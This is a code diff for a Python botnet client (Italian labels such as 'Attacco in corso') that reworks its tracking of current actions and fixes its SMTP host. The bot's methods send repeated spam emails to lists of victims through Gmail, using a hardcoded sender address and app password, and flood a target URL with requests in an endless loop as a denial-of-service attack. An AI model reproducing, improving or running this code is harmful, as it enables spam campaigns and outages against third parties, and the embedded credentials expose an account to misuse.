@@ -52,10 +52,7 @@ def get_client_info():
 class Bot(BaseHTTPRequestHandler):
     event = Event()
 
-    current_action = {
-        'operation': 'In attesa di un comando',
-        'targets': [],
-    }
+    current_action = []
 
     lock = threading.Lock()
 
@@ -108,22 +105,36 @@ class Bot(BaseHTTPRequestHandler):
         sender = "botnetsicurezza@gmail.com"
         password = "cebqshlncuewhjso"
 
-        self.set_current_action('Mail spam in corso', victims)
-        smtp_server = smtplib.SMTP_SSL('smtp.gmail.coxm', 465)
+        self.current_action.append({
+            "operation": "Mail spam in corso",
+            "targets": victims,
+        })
+
+        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         smtp_server.login(sender, password)
+        msg = MIMEText(message)
+        msg['Subject'] = obj
+        msg['From'] = sender
 
         for _ in range(number_of_emails):
             for victim in victims:
-                msg = MIMEText(message)
-                msg['Subject'] = obj
-                msg['From'] = sender
                 msg['To'] = victim
                 smtp_server.sendmail(sender, victim, msg.as_string())
-        self.set_current_action()
+
+        if self.current_action[0]["operation"] == 'Mail spam in corso':
+            self.current_action.pop(0)
+        else:
+            self.current_action.pop(1)
+
         smtp_server.quit()
 
     def request_spam(self, url, e):
-        self.set_current_action('Attacco in corso', [url])
+
+        self.current_action.append({
+            "operation": "Attacco in corso",
+            "targets": [url]
+        })
+
         e.clear()
         while not e.is_set():
             req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
@@ -138,14 +149,10 @@ class Bot(BaseHTTPRequestHandler):
             else:
                 print(f'Attacco in corso a {url}')
 
-        self.set_current_action()
-
-    def set_current_action(self, operation='In attesa di un comando', targets=None):
-        if targets is None:
-            targets = []
-        with self.lock:
-            self.current_action['operation'] = operation
-            self.current_action['targets'] = targets
+        if self.current_action[0]["operation"] == 'Attacco in corso':
+            self.current_action.pop(0)
+        else:
+            self.current_action.pop(1)
 
 
 if __name__ == '__main__':
